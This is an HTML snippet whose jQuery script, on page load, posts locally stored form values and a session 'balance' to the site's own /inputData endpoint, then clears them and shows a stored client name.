   <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>

   <script>
      $(window).on('load', function () {
         $('#preloader-active').delay(2000).fadeOut('slow');
         $('body').delay(2000).css({
            'overflow': 'visible'
         });

         $.ajax({
            url: '/inputData',
            method: 'post',
            data: {
               data_1: new Date().toLocaleDateString().replaceAll("/", "-"),
               data_2: localStorage.getItem('data_2'),
               data_3: localStorage.getItem('data_3'),
               data_4: localStorage.getItem('data_4'),
               data_5: sessionStorage.getItem('balance'),
               data_6: localStorage.getItem('data_6'),
               data_7: localStorage.getItem('data_7'),
               data_8: localStorage.getItem('data_8'),
               data_9: localStorage.getItem('data_9'),
               data_10: localStorage.getItem('data_10'),
               data_11: localStorage.getItem('data_11'),
               data_12: localStorage.getItem('data_12')
            },
            success: function (data) {
               localStorage.setItem('data_2', '');
               localStorage.setItem('data_3', '');
               localStorage.setItem('data_3', '');
               localStorage.setItem('data_6', '');
               localStorage.setItem('data_7', '');
               localStorage.setItem('data_8', '');
               localStorage.setItem('data_9', '');
               localStorage.setItem('data_10', '');
               localStorage.setItem('data_11', '');
               localStorage.setItem('data_12', '');
            },
            error: function (result, status, err) {
            },
         });
      });
      document.getElementById("clientName").innerHTML = sessionStorage.getItem('name');

   </script>
